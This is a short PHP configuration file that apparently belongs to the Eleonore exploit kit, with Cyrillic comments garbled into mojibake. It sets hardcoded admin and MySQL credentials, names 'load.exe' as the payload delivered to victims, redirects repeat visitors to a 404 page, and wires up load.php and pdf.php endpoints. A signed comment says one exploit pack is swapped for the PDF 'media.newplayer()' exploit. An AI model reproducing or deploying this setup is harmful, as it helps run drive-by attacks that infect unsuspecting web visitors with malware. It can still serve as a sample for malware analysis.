<?php

//================== // ������// CONFIG // ===========================//
$admin	= 'admin';					//  Login 
$pwd		= 'admin';					// Password


//=============== // MySQL BATABASE // ��������� ��  =====================//
$db_host	= 'localhost';				// DB Host
$db_name	= 'eleonore';				// DB Name
$db_user	= 'root';				      // DB User
$db_pass	= 'lor11';					// DB Pass



// ===================================================================================================== �� ����������� �������������. // not edit
$redir_not_uniq = "404.php";	     			// ��������������� ��� ��������.
$file_load      = "load.exe";			      //���� ��� �������� - ��� �����  �� �������


//FF soc_pack Disabled :p enjoy the pdf media.newplayer(); exploit instead. [nem]icq:564632782
$soc_pack=0;



//=============== other   ==========// Don't touch //========�� ���� ������������� ===========//
$url ="http://".$_SERVER["HTTP_HOST"].str_replace ("\\", "/", dirname ($_SERVER["PHP_SELF"]));
$load = $url."/load.php";
$pdf =  $url."/pdf.php";
?>